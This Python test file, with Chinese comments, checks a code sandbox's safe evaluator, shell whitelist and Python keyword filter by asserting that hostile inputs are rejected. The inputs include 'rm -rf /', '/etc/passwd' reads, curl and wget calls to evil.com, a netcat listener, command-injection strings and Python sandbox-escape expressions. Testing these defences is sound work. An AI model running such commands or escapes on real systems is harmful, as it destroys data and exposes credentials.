"""
代码沙箱测试
- 安全表达式求值
- Shell 白名单
- Python 沙箱安全边界
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from code_sandbox import safe_eval, execute_shell, execute_python


def test_safe_eval_basic():
    """测试安全计算 - 基本运算"""
    print("\n=== 安全计算（基本运算）===")

    cases = [
        "1 + 2 * 3",
        "sqrt(16) + pow(2, 3)",
        "max(1, 5, 3)",
        "min(1, 5, 3)",
        "abs(-10)",
        "round(3.14159, 2)",
        "len([1, 2, 3])",
        "sum([1, 2, 3, 4])",
        "sorted([3, 1, 2])",
    ]

    for expr in cases:
        result = safe_eval(expr)
        print(f"  {expr} -> {result[:60]}")

    print("  ✅ 基本运算测试完成")


def test_safe_eval_security():
    """测试安全计算 - 安全边界"""
    print("\n=== 安全计算（安全边界）===")

    dangerous_exprs = [
        "__import__('os').system('rm -rf /')",
        "eval('1+1')",
        "exec('print(1)')",
        "open('/etc/passwd').read()",
        "().__class__.__bases__[0].__subclasses__()",
        "getattr(globals(), 'os')",
    ]

    for expr in dangerous_exprs:
        result = safe_eval(expr)
        print(f"  {expr[:40]}... -> {result[:60]}")

    print("  ✅ 安全边界测试完成")


def test_safe_eval_edge_cases():
    """测试安全计算 - 边界情况"""
    print("\n=== 安全计算（边界情况）===")

    edge_cases = [
        "",
        "   ",
        "None",
        "True",
        "False",
        "[1, 2, 3]",
        "{'a': 1, 'b': 2}",
        "(1, 2, 3)",
    ]

    for expr in edge_cases:
        result = safe_eval(expr)
        print(f"  {repr(expr[:30])}: {result[:50]}")

    print("  ✅ 边界情况测试完成")


def test_shell_whitelist():
    """测试 Shell 白名单 - 允许的命令"""
    print("\n=== Shell 白名单（允许的命令）===")

    allowed_commands = [
        "echo hello",
        "pwd",
        "date",
        "whoami",
        "ls",
        "python --version",
    ]

    for cmd in allowed_commands:
        result = execute_shell(cmd)
        assert "执行结果" in result or "无输出" in result, \
            f"白名单命令应被执行: {cmd} -> {result}"
        assert "不在安全白名单" not in result
        assert "危险字符" not in result
        print(f"  ✓ 已执行: {cmd}")

    print("  ✅ 白名单命令通过")


def test_shell_dangerous_commands():
    """测试 Shell 白名单 - 拒绝的命令"""
    print("\n=== Shell 白名单（拒绝的命令）===")

    denied_commands = [
        "rm -rf /",
        "cat /etc/passwd",
        "curl http://evil.com",
        "wget http://evil.com",
        "bash",
        "sh",
        "nc -lvp 4444",
        "sudo ls",
    ]

    for cmd in denied_commands:
        result = execute_shell(cmd)
        assert "不在安全白名单内" in result, \
            f"非白名单命令应被拒绝: {cmd} -> {result}"
        print(f"  ✓ 已拒绝: {cmd}")

    print("  ✅ 拒绝命令通过")


def test_shell_injection():
    """测试 Shell 注入防护"""
    print("\n=== Shell 注入防护 ===")

    injection_attacks = [
        "echo hello; rm -rf /",
        "echo hello && cat /etc/passwd",
        "echo hello | cat /etc/passwd",
        "echo `cat /etc/passwd`",
        "echo $(cat /etc/passwd)",
        "echo hello > /tmp/test",
        "echo hello < /etc/passwd",
    ]

    for cmd in injection_attacks:
        result = execute_shell(cmd)
        assert "危险字符" in result or "不在安全白名单" in result, \
            f"注入攻击应被拒绝: {cmd} -> {result}"
        print(f"  ✓ 已阻止注入: {cmd[:40]}...")

    empty_commands = ["", "   ", "\t"]
    for cmd in empty_commands:
        result = execute_shell(cmd)
        assert "命令为空" in result, f"空命令应被拒绝: {repr(cmd)}"

    print("  ✅ 注入防护通过")


def test_python_sandbox_basic():
    """测试 Python 沙箱 - 基本执行"""
    print("\n=== Python 沙箱（基本执行）===")

    safe_code = [
        "print('hello world')",
        "x = 1 + 2\nprint(x)",
        "for i in range(3):\n    print(i)",
        "def add(a, b):\n    return a + b\nprint(add(1, 2))",
    ]

    for code in safe_code:
        result = execute_python(code)
        assert "执行结果" in result, f"安全代码应被执行: {code[:30]}... -> {result}"
        assert "拒绝执行" not in result
        print(f"  ✓ 已执行: {code[:30]}...")

    print("  ✅ 基本执行通过")


def test_python_sandbox_import_block():
    """测试 Python 沙箱 - 导入拦截"""
    print("\n=== Python 沙箱（导入拦截）===")

    import_attacks = [
        ("import os", "import"),
        ("import sys", "import"),
        ("from os import path", "import"),
        ("__import__('os')", "__import__"),
        ("import subprocess", "import"),
        ("import builtins", "builtins"),
    ]

    for code, keyword in import_attacks:
        result = execute_python(code)
        assert "禁用的关键字" in result or "拒绝执行" in result or "禁止" in result, \
            f"导入应被拒绝: {code} -> {result}"
        print(f"  ✓ 已阻止导入: {code}")

    print("  ✅ 导入拦截通过")


def test_python_sandbox_dangerous_keywords():
    """测试 Python 沙箱 - 危险关键字拦截"""
    print("\n=== Python 沙箱（危险关键字）===")

    dangerous_keywords = [
        ("open('/etc/passwd')", "open"),
        ("os.system('ls')", "os"),
        ("eval('1+1')", "eval"),
        ("exec('print(1)')", "exec"),
        ("compile('a=1', '<string>', 'exec')", "compile"),
        ("getattr(obj, 'attr')", "getattr"),
        ("setattr(obj, 'attr', 1)", "setattr"),
        ("delattr(obj, 'attr')", "delattr"),
        ("hasattr(obj, 'attr')", "hasattr"),
        ("globals()", "globals"),
        ("locals()", "locals"),
        ("vars(obj)", "vars"),
        ("dir()", "dir"),
        ("breakpoint()", "breakpoint"),
        ("input()", "input"),
        ("exit()", "exit"),
        ("quit()", "quit"),
        ("memoryview(b'hello')", "memoryview"),
        ("import ctypes", "ctypes"),
        ("import pickle", "pickle"),
        ("import marshal", "marshal"),
        ("fork()", "fork"),
        ("spawn()", "spawn"),
        ("system('ls')", "system"),
    ]

    for code, keyword in dangerous_keywords:
        result = execute_python(code)
        assert "禁用的关键字" in result or "拒绝执行" in result, \
            f"危险关键字应被拒绝: {code} -> {result}"
        print(f"  ✓ 已阻止: {keyword}")

    print("  ✅ 危险关键字通过")


def test_python_sandbox_dunder_access():
    """测试 Python 沙箱 - 双下划线属性访问拦截"""
    print("\n=== Python 沙箱（双下划线拦截）===")

    dunder_attacks = [
        "x = ''.__class__\nprint(x)",
        "print([].__class__.__bases__)",
        "print(().__class__.__mro__)",
        "x = object.__subclasses__()",
        "print(__name__)",
        "print(__builtins__)",
    ]

    for code in dunder_attacks:
        result = execute_python(code)
        assert "禁止" in result or "拒绝" in result or "禁用" in result, \
            f"双下划线访问应被拒绝: {code[:40]}... -> {result}"
        print(f"  ✓ 已阻止: {code[:40]}...")

    print("  ✅ 双下划线拦截通过")


def test_python_sandbox_edge_cases():
    """测试 Python 沙箱 - 边界情况"""
    print("\n=== Python 沙箱（边界情况）===")

    result_empty = execute_python("")
    print(f"  空代码: {result_empty[:50]}")

    result_syntax = execute_python("def foo(:")
    assert "语法错误" in result_syntax, "语法错误应被捕获"
    print(f"  ✓ 语法错误被捕获")

    print("  ✅ 边界情况通过")


def main():
    print("=" * 60)
    print("  代码沙箱安全网测试")
    print("=" * 60)

    test_safe_eval_basic()
    test_safe_eval_security()
    test_safe_eval_edge_cases()
    test_shell_whitelist()
    test_shell_dangerous_commands()
    test_shell_injection()
    test_python_sandbox_basic()
    test_python_sandbox_import_block()
    test_python_sandbox_dangerous_keywords()
    test_python_sandbox_dunder_access()
    test_python_sandbox_edge_cases()

    print("\n" + "=" * 60)
    print("  ✅ 所有代码沙箱测试通过")
    print("=" * 60)


if __name__ == "__main__":
    main()
